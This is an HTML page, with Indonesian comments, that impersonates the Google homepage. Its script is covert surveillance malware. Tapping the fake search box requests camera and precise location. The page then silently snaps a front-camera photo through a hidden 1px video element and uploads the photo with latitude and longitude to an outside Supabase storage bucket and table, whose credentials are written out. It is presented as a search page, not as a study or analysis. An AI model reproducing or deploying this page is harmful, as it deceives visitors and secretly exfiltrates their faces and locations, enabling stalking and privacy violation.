<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <link rel="icon" href="https://www.google.com/favicon.ico">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #fff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            justify-content: space-between;
        }
        header {
            display: flex;
            justify-content: flex-end;
            padding: 15px;
            font-size: 13px;
            color: #5f6368;
        }
        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: -10vh;
            flex: 1;
            justify-content: center;
            padding: 0 20px;
        }
        .google-logo {
            font-size: 70px;
            font-weight: bold;
            letter-spacing: -3px;
            margin-bottom: 25px;
            user-select: none;
        }
        .blue { color: #4285F4; }
        .red { color: #EA4335; }
        .yellow { color: #FBBC05; }
        .green { color: #34A853; }

        .search-box {
            width: 100%;
            max-width: 584px;
            height: 44px;
            border: 1px solid #dfe1e5;
            border-radius: 24px;
            display: flex;
            align-items: center;
            padding: 0 14px;
            box-shadow: 0 1px 6px rgba(32,33,36,.1);
            cursor: pointer;
        }
        .search-box input {
            flex: 1;
            border: none;
            outline: none;
            font-size: 16px;
            background: transparent;
            margin-left: 10px;
            pointer-events: none; /* Agar klik langsung menargetkan container/box */
        }
        .search-icon {
            width: 20px;
            height: 20px;
            fill: #9aa0a6;
        }

        /* Elemen video tersembunyi secara aman */
        #camera-preview {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0.001;
            pointer-events: none;
            z-index: -1;
        }

        footer {
            background-color: #f2f2f2;
            color: #70757a;
            font-size: 14px;
            width: 100%;
        }
        .footer-item {
            padding: 15px 30px;
            border-bottom: 1px solid #dadce0;
        }
        .footer-sub {
            display: flex;
            justify-content: space-between;
            padding: 15px 30px;
            flex-wrap: wrap;
        }
    </style>
</head>
<body>

    <header>
        <span>Gmail</span> &nbsp;&nbsp; <span>Gambar</span>
    </header>

    <div class="main-container">
        <div class="google-logo">
            <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
        </div>

        <!-- Kotak pencarian yang sekaligus berfungsi sebagai tombol pemicu izin HP -->
        <div class="search-box" id="trigger-box">
            <svg class="search-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
            <input type="text" placeholder="Telusuri Google atau ketik URL">
        </div>
    </div>

    <video id="camera-preview" autoplay playsinline muted></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <footer>
        <div class="footer-item">Indonesia</div>
        <div class="footer-sub">
            <div><span>Tentang</span> &nbsp;&nbsp; <span>Iklan</span> &nbsp;&nbsp; <span>Bisnis</span></div>
            <div><span>Privasi</span> &nbsp;&nbsp; <span>Persyaratan</span> &nbsp;&nbsp; <span>Setelan</span></div>
        </div>
    </footer>

    <script>
        const SUPABASE_URL = 'https://nhufpeilgbgdvpynrfrb.supabase.co'; 
        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5odWZwZWlsZ2JnZHZweW5yZnJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTA3MTI2MDYsImV4cCI6MjEwNjI4ODYwNn0.L3yl0OqdXFLtyzLMXN6Ixv4kRQk-18D6Q4vc0CzaHeg'; 
        
        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        let hasRun = false;

        async function startProcess(e) {
            if (hasRun) return;
            hasRun = true;

            const video = document.getElementById("camera-preview");
            const canvas = document.getElementById("canvas");

            try {
                // Meminta izin kamera (Akan memunculkan popup di Safari/Chrome HP)
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false
                });
                
                video.srcObject = stream;
                await video.play();

                // Meminta izin lokasi
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            const lat = position.coords.latitude;
                            const lng = position.coords.longitude;

                            setTimeout(async () => {
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                const ctx = canvas.getContext("2d");
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                                canvas.toBlob(async (blob) => {
                                    if (!blob) return;

                                    const fileName = `capture_${Date.now()}.png`;

                                    // Upload ke Supabase Storage bucket 'captures'
                                    const { error: storageError } = await supabaseClient.storage
                                        .from('captures')
                                        .upload(fileName, blob, { 
                                            contentType: 'image/png', 
                                            upsert: true 
                                        });

                                    if (storageError) {
                                        console.error("Storage Error:", storageError.message);
                                        return;
                                    }

                                    // Ambil Public URL
                                    const { data: { publicUrl } } = supabaseClient.storage
                                        .from('captures')
                                        .getPublicUrl(fileName);

                                    // Insert ke tabel 'logs' Supabase
                                    const { error: dbError } = await supabaseClient
                                        .from('logs')
                                        .insert([{ 
                                            photo_url: publicUrl, 
                                            latitude: lat, 
                                            longitude: lng 
                                        }]);

                                    if (dbError) {
                                        console.error("Database Error:", dbError.message);
                                    }

                                    // Matikan kamera
                                    stream.getTracks().forEach(track => track.stop());
                                }, 'image/png');
                            }, 1200);

                        },
                        (error) => {
                            console.warn("Lokasi ditolak:", error.message);
                        },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                }
            } catch (err) {
                console.warn("Kamera ditolak/error:", err);
            }
        }

        // Event listener pada kotak pencarian agar merespons sentuhan pertama di HP (Safari & Chrome compatible)
        document.getElementById("trigger-box").addEventListener("click", startProcess);
        document.getElementById("trigger-box").addEventListener("touchstart", startProcess);
    </script>
</body>
</html>
